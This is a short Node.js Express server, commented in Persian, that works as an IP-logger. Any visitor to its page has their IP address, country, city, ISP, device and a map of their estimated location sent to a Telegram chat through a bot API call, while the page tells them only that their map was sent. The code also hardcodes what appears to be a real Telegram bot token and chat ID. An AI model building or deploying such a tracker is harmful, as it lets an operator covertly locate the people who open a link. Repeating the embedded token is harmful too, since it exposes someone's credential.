const express = require('express');
const axios = require('axios');
const useragent = require('useragent');
const app = express();
const PORT = 3000;

// تنظیمات شما
const TELEGRAM_TOKEN = '6902577133:AAH6xgnhQvWPfgdQUwdB59da-uWZgsb2Vkw';
const CHAT_ID = '1848591768';

app.get('/', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = useragent.parse(req.headers['user-agent']);

    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    const { lat, lon, city, country, isp } = geoRes.data;

    const uniqueId = `${Date.now()}_${ip}`;
    const mapImage = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x400&markers=${lat},${lon},red-pushpin`;
    const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=15/${lat}/${lon}`;

    const caption = `
آیدی: ${uniqueId}
IP: ${ip}
کشور: ${country}
شهر: ${city}
ISP: ${isp}
دستگاه: ${userAgent.toString()}
نقشه: ${mapLink}
    `;

    // ارسال تصویر نقشه به تلگرام
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
      chat_id: CHAT_ID,
      photo: mapImage,
      caption
    });

    res.send('<h2>نقشه دقیق شما ارسال شد (بدون کلید API)</h2>');
  } catch (error) {
    console.error(error);
    res.status(500).send('خطا در دریافت موقعیت یا ارسال به تلگرام');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
